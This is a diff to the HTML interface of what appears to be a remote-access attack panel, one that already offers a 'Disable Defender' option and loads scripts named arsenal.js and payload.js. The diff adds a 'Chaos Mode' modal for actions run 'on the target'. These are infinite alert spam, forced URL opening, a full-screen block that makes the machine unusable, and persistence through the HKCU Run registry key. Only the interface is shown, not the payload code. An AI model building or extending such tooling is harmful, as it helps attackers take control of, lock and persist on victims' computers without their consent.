@@ -494,6 +494,12 @@
                             <div class="feature-category system">
                                 <h3>🛡️ System Admin</h3>
                                 <div class="feature-card">
+                                    <div class="card-icon">🎭</div>
+                                    <h4>Chaos Mode</h4>
+                                    <p>Pranks, interactions & annoyances.</p>
+                                    <button class="btn-feature" onclick="configureChaos()">Execute</button>
+                                </div>
+                                <div class="feature-card">
                                     <div class="card-icon">🛑</div>
                                     <h4>Disable Defender</h4>
                                     <p>Attempt to disable AV (Admin Required).</p>
@@ -544,6 +550,69 @@
     <script src="arsenal.js"></script>
     <script src="renderer.js"></script>
     <script src="payload.js"></script>
+
+    <!-- Chaos Mode Configuration Modal -->
+    <div id="chaosModal" class="modal-overlay" style="display: none;">
+        <div class="modal-content" style="max-width: 600px;">
+            <h3>🎭 Chaos Mode Configuration</h3>
+            <p>Select prank features to execute on the target.</p>
+
+            <div style="display: flex; flex-direction: column; gap: 10px; text-align: left; margin-top: 15px;">
+                <!-- Alert -->
+                <div style="background: #222; padding: 10px; border-radius: 5px;">
+                    <label><input type="checkbox" id="chaosAlert"> 🔔 Show Alert Message</label>
+                    <input type="text" id="chaosAlertMsg" placeholder="Message (e.g. You are hacked!)"
+                        style="width: 100%; margin-top: 5px; background: #333; color: white; border: 1px solid #555;">
+                </div>
+
+                <!-- Spam -->
+                <div style="background: #222; padding: 10px; border-radius: 5px;">
+                    <label><input type="checkbox" id="chaosSpam"> ♾️ Spam Alerts (Infinite Loop)</label>
+                    <input type="number" id="chaosSpamCount" placeholder="Count (e.g. 50)"
+                        style="width: 100%; margin-top: 5px; background: #333; color: white; border: 1px solid #555;">
+                </div>
+
+                <!-- URL -->
+                <div style="background: #222; padding: 10px; border-radius: 5px;">
+                    <label><input type="checkbox" id="chaosUrl"> 🔗 Open URL</label>
+                    <input type="text" id="chaosUrlLink" placeholder="https://youtube.com/..."
+                        style="width: 100%; margin-top: 5px; background: #333; color: white; border: 1px solid #555;">
+                </div>
+
+                <!-- Block Screen -->
+                <div style="background: #222; padding: 10px; border-radius: 5px;">
+                    <label><input type="checkbox" id="chaosBlock"> 🚫 Block Screen (Full Overlay)</label>
+                    <small style="display: block; color: #f55; margin-left: 20px;">Warning: Makes machine unusable until
+                        stopped!</small>
+                </div>
+
+                <!-- Persistence -->
+                <div style="background: #3a1111; padding: 10px; border-radius: 5px; border: 1px solid #f55;">
+                    <label style="color: #f88; font-weight: bold;"><input type="checkbox" id="chaosPersist"> ☠️ Persist
+                        on Restart (Registry)</label>
+                    <small style="display: block; color: #faa; margin-left: 20px;">Adds payload to HKCU Run key. Prank
+                        starts on login.</small>
+                </div>
+            </div>
+
+            <div class="modal-actions" style="margin-top: 20px; flex-wrap: wrap;">
+                <button class="btn btn-secondary" onclick="closeChaosModal()">Close</button>
+                <button class="btn btn-primary" onclick="triggerChaos()" style="background: #d32f2f;">🔥 Execute
+                    Chaos</button>
+            </div>
+            <div class="modal-actions" style="margin-top: 10px; border-top: 1px solid #444; padding-top: 10px;">
+                <small style="width: 100%; text-align: center; color: #aaa; margin-bottom: 5px;">Emergency
+                    Controls</small>
+                <button class="btn" onclick="stopChaosSpam()"
+                    style="background: #444; font-size: 0.8em; margin: 2px;">⏹️ Stop Spam</button>
+                <button class="btn" onclick="stopChaosBlock()"
+                    style="background: #444; font-size: 0.8em; margin: 2px;">🔓 Unlock Screen</button>
+                <button class="btn" onclick="removePersistence()"
+                    style="background: #444; font-size: 0.8em; margin: 2px;">🧹 Clean Registry</button>
+            </div>
+        </div>
+    </div>
+
     <!-- Jitter Configuration Modal -->
     <div id="jitterModal" class="modal-overlay" style="display: none;">
         <div class="modal-content">
